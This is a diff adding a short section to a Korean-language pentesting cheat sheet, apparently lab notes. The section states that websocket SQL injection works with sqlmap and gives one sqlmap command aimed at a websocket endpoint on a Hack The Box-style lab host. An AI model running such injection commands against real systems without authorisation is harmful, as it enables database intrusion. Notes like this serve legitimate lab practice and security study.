@@ -541,3 +541,14 @@ db.users.deleteOne({name: "test"})
 ```
 
 </details>
+
+---
+<details>
+  <summary><strong>SQLMAP</strong></summary>
+
+- `SQLMAP`으로 웹소켓 인젝션이 가능하다.
+```bash
+sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"1234"}'
+```
+  
+</details>
